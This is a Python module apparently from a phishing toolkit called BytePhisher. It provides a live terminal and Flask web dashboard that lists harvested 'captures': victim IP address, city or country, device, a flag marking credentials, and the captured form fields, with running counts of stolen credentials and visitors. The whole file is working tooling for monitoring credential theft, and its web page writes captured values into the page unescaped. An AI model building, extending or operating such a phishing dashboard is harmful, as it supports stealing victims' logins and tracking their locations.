# BytePhisher — live dashboard: rich TUI (primary) + optional Flask web dashboard.
import json
import time

def make_frame(caps, stats):
    """Build one rich renderable frame (used by live_loop and by callers)."""
    from rich.table import Table
    from rich.panel import Panel
    from datetime import datetime

    t = Table(title="BytePhisher — Live Captures", title_style="bold magenta", expand=True)
    t.add_column("Time", width=8)
    t.add_column("IP / Geo")
    t.add_column("Device", width=8)
    t.add_column("Cred", justify="center", width=5)
    t.add_column("Captured Fields", overflow="fold")
    for c in caps:
        ts = datetime.fromtimestamp(c["ts"]).strftime("%H:%M:%S")
        geo = c["city"] or c["country"] or "—"
        t.add_row(
            ts,
            f'{c["ip"]} ({geo})',
            c["device"],
            "[bold green]✓[/]" if c["is_cred"] else "[dim]·[/]",
            "; ".join(f'{k}={v}' for k, v in list(c["fields"].items())[:4]),
        )
    subtitle = (f'[bold]captures[/] {stats["total_captures"]}  '
                f'[bold green]creds[/] {stats["credentials"]}  '
                f'[bold]visitors[/] {stats["visitors"]}')
    return Panel(t, subtitle=subtitle)


def live_loop(db, stop, refresh=1.5):
    """Run a full-screen rich dashboard until stop['flag'] is set.
    Reads the capture DB on every refresh, so new hits appear live."""
    from rich.console import Console
    from rich.live import Live

    console = Console()
    with Live(make_frame(db.all(40), db.stats()), console=console,
              refresh_per_second=4, screen=True, transient=False) as live:
        while not stop.get("flag"):
            time.sleep(refresh)
            live.update(make_frame(db.all(40), db.stats()))


def render_tui(caps, stats, refresh=3):
    """Single-shot TUI snapshot (kept for compatibility / scripting)."""
    from rich.console import Console
    Console().print(make_frame(caps, stats))

def render_plain(caps, stats):
    """Non-TTY fallback: print a compact table to stdout."""
    print("=" * 70)
    print("BYTEPHISHER — LIVE CAPTURES")
    print("=" * 70)
    for c in caps[:20]:
        from datetime import datetime
        ts = datetime.fromtimestamp(c["ts"]).strftime("%H:%M:%S")
        cred = "CRED" if c["is_cred"] else "    "
        print(f'[{ts}] {c["ip"]:>15} {c["device"]:>8} {cred} {c["city"] or c["country"] or ""}')
        for k, v in c["fields"].items():
            print(f"         {k} = {v}")
    print("-" * 70)
    print(f'captures={stats["total_captures"]} creds={stats["credentials"]} visitors={stats["visitors"]}')

def web_dashboard(port=8090, db=None, host="127.0.0.1"):
    """Optional Flask + WebSocket dashboard for remote monitoring.
    Serves / (live table), /api/captures, /api/stats."""
    from flask import Flask, jsonify, render_template_string, request
    import threading

    app = Flask("bytephisher-dash")

    PAGE = """<!doctype html><html><head><title>BytePhisher Dashboard</title>
<style>
body{font-family:system-ui;background:#0d1117;color:#e6edf3;padding:20px}
table{width:100%;border-collapse:collapse}
td,th{border-bottom:1px solid #30363d;padding:6px 10px;text-align:left}
.badge{display:inline-block;padding:2px 8px;border-radius:10px;background:#1f6feb33;color:#58a6ff}
</style></head><body>
<h2>BytePhisher — Live Dashboard</h2>
<table><thead><tr><th>Time</th><th>IP</th><th>Geo</th><th>Device</th><th>Cred</th><th>Fields</th></tr></thead>
<tbody id="rows"><tr><td colspan="6" style="color:#8b949e">loading…</td></tr></tbody></table>
<div id="stats" class="badge"></div>
<script>
function poll(){
  fetch('/api/captures?limit=20').then(r=>r.json()).then(caps=>{
    const tb=document.querySelector('#rows');
    if(!caps.length){tb.innerHTML='<tr><td colspan="6" style="color:#8b949e">no captures yet</td></tr>';return;}
    tb.innerHTML=caps.map(c=>{
      const t=new Date(c.ts*1000).toLocaleTimeString();
      const f=Object.entries(c.fields).slice(0,4).map(([k,v])=>k+'='+v).join('; ');
      return `<tr><td>${t}</td><td>${c.ip}</td><td>${c.city||c.country||'—'}</td>
        <td>${c.device}</td><td>${c.is_cred?'<span class="badge">CRED</span>':'·'}</td><td>${f}</td></tr>`;
    }).join('');
  });
  fetch('/api/stats').then(r=>r.json()).then(s=>{
    document.getElementById('stats').textContent=
      `captures ${s.total_captures} | creds ${s.credentials} | visitors ${s.visitors}`;
  });
  setTimeout(poll, 2000);
}
poll();
</script></body></html>"""

    @app.route("/")
    def index():
        return render_template_string(PAGE)

    @app.route("/api/captures")
    def api_captures():
        limit = int(request.args.get("limit", 20))
        return jsonify(db.all(limit))

    @app.route("/api/stats")
    def api_stats():
        return jsonify(db.stats())

    th = threading.Thread(target=app.run,
                           kwargs=dict(host=host, port=port, debug=False, use_reloader=False),
                           daemon=True)
    th.start()
    return app, th
